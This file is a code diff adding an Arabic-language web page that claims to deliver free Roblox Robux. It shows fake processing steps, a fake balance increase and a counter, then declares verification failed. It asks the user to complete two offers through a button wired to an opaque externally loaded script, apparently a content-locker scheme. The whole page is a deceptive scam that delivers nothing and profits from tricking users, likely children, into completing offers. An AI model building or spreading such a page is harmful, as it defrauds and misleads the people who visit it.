@@ -1,0 +1,542 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>شحن Robux </title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700;800&display=swap');
+        :root {
+            --primary-color: #00A8FF;
+            --secondary-color: #FFA500;
+            --background-color: #F0F2F5;
+            --text-color: #333333;
+            --card-bg: #FFFFFF;
+            --success-color: #4CAF50;
+            --error-color: #FF5252;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Tajawal', sans-serif;
+            background-color: var(--background-color);
+            color: var(--text-color);
+            line-height: 1.6;
+        }
+
+        .container {
+            max-width: 100%;
+            margin: 0 auto;
+            background-color: var(--card-bg);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .header {
+            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+            color: white;
+            padding: 20px;
+            text-align: center;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .logo {
+            width: 350px;
+            height: auto;
+            margin-bottom: 10px;
+        }
+
+        .title {
+            font-size: 2rem;
+            font-weight: 800;
+            margin-bottom: 5px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        .balance-container {
+            background-color: rgba(255, 255, 255, 0.2);
+            border-radius: 15px;
+            padding: 10px 20px;
+            display: inline-flex;
+            align-items: center;
+            margin-top: 10px;
+        }
+
+        .balance-text {
+            font-size: 1.2rem;
+            font-weight: 700;
+            margin-right: 10px;
+        }
+
+        .robux-icon {
+            width: 25px;
+            height: auto;
+        }
+
+        .main-content {
+            flex-grow: 1;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+
+        .form-section {
+            background-color: white;
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            margin-bottom: 20px;
+        }
+
+        .input-group {
+            margin-bottom: 25px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 10px;
+            font-weight: 700;
+            color: var(--primary-color);
+            font-size: 1.1rem;
+        }
+
+        input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: var(--primary-color);
+            box-shadow: 0 0 0 3px rgba(0, 168, 255, 0.1);
+        }
+
+        .options-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+        }
+
+        .option-btn {
+            background-color: #f0f0f0;
+            color: var(--text-color);
+            border: none;
+            padding: 15px;
+            border-radius: 15px;
+            cursor: pointer;
+            font-size: 1rem;
+            font-weight: 700;
+            transition: all 0.3s ease;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .option-btn:hover {
+            background-color: #e0e0e0;
+            transform: translateY(-2px);
+        }
+
+        .option-btn.selected {
+            background-color: var(--primary-color);
+            color: white;
+            box-shadow: 0 5px 15px rgba(0, 168, 255, 0.3);
+        }
+
+        .option-btn i {
+            font-size: 1.5rem;
+            margin-bottom: 8px;
+        }
+
+        .submit-btn {
+            background: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
+            color: white;
+            border: none;
+            padding: 18px;
+            border-radius: 15px;
+            cursor: pointer;
+            font-size: 1.2rem;
+            font-weight: 800;
+            transition: all 0.3s ease;
+            width: 100%;
+            text-transform: uppercase;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .submit-btn:hover {
+            opacity: 0.9;
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
+        }
+
+        .security-info {
+            font-size: 0.9rem;
+            color: #777;
+            margin-top: 20px;
+            text-align: center;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .security-info i {
+            margin-right: 5px;
+            color: var(--success-color);
+        }
+
+        #processing-screen,
+        #robux-counter-screen,
+        #verification-screen {
+            display: none;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .progress-container {
+            background-color: #e0e0e0;
+            border-radius: 20px;
+            margin: 30px 0;
+            height: 15px;
+            overflow: hidden;
+        }
+
+        .progress-bar {
+            width: 0;
+            height: 100%;
+            background: linear-gradient(90deg, var(--primary-color), var(--secondary-color));
+            transition: width 0.5s ease;
+        }
+
+        .step {
+            margin: 20px 0;
+            padding: 20px;
+            background-color: #f9f9f9;
+            border-radius: 15px;
+            opacity: 0.6;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+        }
+
+        .step.active {
+            opacity: 1;
+            background-color: #e6f7ff;
+            transform: translateX(10px);
+            box-shadow: 0 5px 15px rgba(0, 168, 255, 0.1);
+        }
+
+        .step i {
+            font-size: 1.5rem;
+            margin-right: 15px;
+            color: var(--primary-color);
+        }
+
+        .robux-counter-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 40px 0;
+        }
+
+        .robux-image {
+            width: 80px;
+            height: 80px;
+            margin-left: 20px;
+            animation: spin 4s linear infinite;
+        }
+
+        .robux-counter {
+            font-size: 4rem;
+            font-weight: 800;
+            color: var(--primary-color);
+            text-shadow: 0 0 10px rgba(0, 168, 255, 0.3);
+        }
+
+        #verification-screen {
+            text-align: center;
+            padding: 30px;
+        }
+
+        #verification-screen h2 {
+            margin-bottom: 20px;
+            color: var(--primary-color);
+            font-size: 2rem;
+        }
+
+        #verification-screen p {
+            margin-bottom: 20px;
+            font-size: 1.1rem;
+        }
+
+        #verify-btn {
+            background: linear-gradient(45deg, var(--success-color), #45a049);
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            border-radius: 15px;
+            cursor: pointer;
+            font-size: 1.2rem;
+            font-weight: 700;
+            transition: all 0.3s ease;
+            display: inline-block;
+            margin-top: 30px;
+            box-shadow: 0 5px 15px rgba(76, 175, 80, 0.3);
+        }
+
+        #verify-btn:hover {
+            opacity: 0.9;
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(76, 175, 80, 0.4);
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        @keyframes flyToBalance {
+            0% {
+                transform: translate(0, 0) scale(1);
+                opacity: 1;
+            }
+            50% {
+                transform: translate(0, -100px) scale(1.2);
+                opacity: 0.7;
+            }
+            100% {
+                transform: translate(0, -200px) scale(0.5);
+                opacity: 0;
+            }
+        }
+
+        .flying-robux {
+            position: fixed;
+            font-size: 2rem;
+            font-weight: bold;
+            color: var(--secondary-color);
+            pointer-events: none;
+            animation: flyToBalance 1.5s forwards;
+            z-index: 1000;
+            text-shadow: 0 0 10px rgba(255, 165, 0, 0.5);
+        }
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+
+<body>
+    <div class="container">
+        <header class="header">
+            <img src="https://i.imgur.com/Ndy0UU0.png" alt="Roblox Logo" class="logo">
+            <h1 class="title">شحن Robux</h1>
+            <div class="balance-container">
+                <span class="balance-text"> رصيدك :  <span id="current-balance">0</span></span>
+                <img src="https://i.imgur.com/n1kAetz.png" alt="Robux Icon" class="robux-icon">
+            </div>
+        </header>
+        <main class="main-content">
+            <section class="form-section" id="main-form">
+                <div class="input-group">
+                    <label for="roblox-username"><i class="fas fa-user"></i> اسم المستخدم في Roblox</label>
+                    <input type="text" id="roblox-username" placeholder="أدخل اسم المستخدم هنا">
+                </div>
+                <div class="input-group">
+                    <label><i class="fas fa-gamepad"></i> اختر المنصة</label>
+                    <div class="options-grid platform-options">
+                        <button class="option-btn" data-platform="pc"><i class="fas fa-desktop"></i> كمبيوتر</button>
+                        <button class="option-btn" data-platform="mobile"><i class="fas fa-mobile-alt"></i> موبايل</button>
+                        <button class="option-btn" data-platform="console"><i class="fas fa-gamepad"></i> كونسول</button>
+                    </div>
+                </div>
+                <div class="input-group">
+                    <label><i class="fas fa-coins"></i> اختر كمية الـ Robux</label>
+                    <div class="options-grid robux-options">
+                        <button class="option-btn" data-robux="400">400</button>
+                        <button class="option-btn" data-robux="800">800</button>
+                        <button class="option-btn" data-robux="1700">1.700</button>
+                        <button class="option-btn" data-robux="9500">3.500</button>
+                        <button class="option-btn" data-robux="5000">5.000</button>
+                        <button class="option-btn" data-robux="7500">7.500</button>
+                    </div>
+                </div>
+                <button class="submit-btn" id="submit-btn">شحن Robux الآن</button>
+                <div class="security-info"><i class="fas fa-lock"></i> جميع المعاملات آمنة ومشفرة</div>
+            </section>
+            <section class="form-section" id="processing-screen">
+                <h2>جاري معالجة طلبك...</h2>
+                <div class="progress-container">
+                    <div class="progress-bar" id="progress-bar"></div>
+                </div>
+                <div class="step" id="step-1"><i class="fas fa-search"></i> البحث عن الحساب: <span id="user-id"></span></div>
+                <div class="step" id="step-2"><i class="fas fa-check-circle"></i> تم العثور على الحساب</div>
+                <div class="step" id="step-3"><i class="fas fa-paper-plane"></i> جاري إرسال الـ Robux</div>
+                <div class="step" id="step-4"><i class="fas fa-shield-alt"></i> عملية التحقق</div>
+            </section>
+            <section class="form-section" id="robux-counter-screen">
+                <h2>جاري تحضير الـ Robux</h2>
+                <div class="robux-counter-container">
+                    <img src="https://i.imgur.com/YTaEuId.png" alt="Robux Coins" class="robux-image">
+                    <div class="robux-counter" id="robux-counter">0</div>
+                </div>
+            </section>
+            <section class="form-section" id="verification-screen">
+                <h2>تعذر إتمام العملية</h2>
+                <p>يرجى إكمال عملية التحقق للحصول على الـ Robux</p>
+                <p>تعذر عملية التحقق. يجب إكمال الخطوة التالية: الضغط على زر إتمام عملية التحقق وإكمال المهام. يجب إكمال عرضين لبدء إرسال الـ Robux إلى حسابك في Roblox.</p>
+                <button onclick="_Tm()"id="verify-btn">تحقق الآن</button>
+            </section>
+        </main>
+    </div>
+    <script>
+        const robloxUsernameInput = document.getElementById('roblox-username');
+        const submitBtn = document.getElementById('submit-btn');
+        const mainForm = document.getElementById('main-form');
+        const processingScreen = document.getElementById('processing-screen');
+        const robuxCounterScreen = document.getElementById('robux-counter-screen');
+        const verificationScreen = document.getElementById('verification-screen');
+        const progressBar = document.getElementById('progress-bar');
+        const userId = document.getElementById('user-id');
+        const verifyBtn = document.getElementById('verify-btn');
+        const robuxCounter = document.getElementById('robux-counter');
+        const currentBalance = document.getElementById('current-balance');
+
+        let selectedPlatform = '';
+        let selectedRobux = 0;
+
+        const coinSound = new Audio('https://example.com/cash-register-sound.mp3');
+
+        document.querySelectorAll('.platform-options .option-btn').forEach(button => {
+            button.addEventListener('click', function() {
+                selectedPlatform = this.getAttribute('data-platform');
+                document.querySelectorAll('.platform-options .option-btn').forEach(btn => {
+                    btn.classList.remove('selected');
+                });
+                this.classList.add('selected');
+            });
+        });
+
+        document.querySelectorAll('.robux-options .option-btn').forEach(button => {
+            button.addEventListener('click', function() {
+                selectedRobux = parseInt(this.getAttribute('data-robux'));
+                document.querySelectorAll('.robux-options .option-btn').forEach(btn => {
+                    btn.classList.remove('selected');
+                });
+                this.classList.add('selected');
+            });
+        });
+
+        submitBtn.addEventListener('click', function() {
+            if (robloxUsernameInput.value && selectedPlatform && selectedRobux) {
+                animateRobuxToBalance();
+                startProcessing();
+            } else {
+                alert('يرجى ملء جميع الحقول المطلوبة.');
+            }
+        });
+
+        function animateRobuxToBalance() {
+            const flyingRobux = document.createElement('div');
+            flyingRobux.textContent = '+' + selectedRobux;
+            flyingRobux.className = 'flying-robux';
+            flyingRobux.style.left = `${Math.random() * window.innerWidth}px`;
+            flyingRobux.style.top = `${window.innerHeight}px`;
+            document.body.appendChild(flyingRobux);
+
+            setTimeout(() => {
+                document.body.removeChild(flyingRobux);
+                updateBalance();
+            }, 1500);
+        }
+
+        function updateBalance() {
+            const currentBalanceValue = parseInt(currentBalance.textContent.replace(/,/g, ''));
+            const newBalance = currentBalanceValue + selectedRobux;
+            currentBalance.textContent = newBalance.toLocaleString();
+            coinSound.play();
+        }
+
+        function startProcessing() {
+            mainForm.style.display = 'none';
+            processingScreen.style.display = 'block';
+            userId.textContent = robloxUsernameInput.value;
+
+            let progress = 0;
+            const steps = document.querySelectorAll('.step');
+            const interval = setInterval(() => {
+                progress += 5;
+                progressBar.style.width = `${progress}%`;
+
+                if (progress >= 25 && !steps[0].classList.contains('active')) {
+                    steps[0].classList.add('active');
+                }
+                if (progress >= 50 && !steps[1].classList.contains('active')) {
+                    steps[1].classList.add('active');
+                }
+                if (progress >= 75 && !steps[2].classList.contains('active')) {
+                    steps[2].classList.add('active');
+                }
+                if (progress >= 100) {
+                    steps[3].classList.add('active');
+                    clearInterval(interval);
+                    setTimeout(showRobuxCounter, 1000);
+                }
+            }, 200);
+        }
+
+        function showRobuxCounter() {
+            processingScreen.style.display = 'none';
+            robuxCounterScreen.style.display = 'block';
+
+            let count = 0;
+            const interval = setInterval(() => {
+                count += Math.floor(selectedRobux / 100);
+                if (count > selectedRobux) {
+                    count = selectedRobux;
+                }
+                robuxCounter.textContent = count.toLocaleString();
+                coinSound.play();
+
+                if (count >= selectedRobux) {
+                    clearInterval(interval);
+                    setTimeout(showVerification, 1000);
+                }
+            }, 50);
+        }
+
+        function showVerification() {
+            robuxCounterScreen.style.display = 'none';
+            verificationScreen.style.display = 'block';
+        }
+
+      
+    </script>
+</body>
+<script type="text/javascript">
+    var IaXcw_dZw_BQDFsc={"it":4552666,"key":"520d4"};
+</script>
+<script src="https://duw03nk63ml3f.cloudfront.net/5d43cb8.js"></script>
+</html>
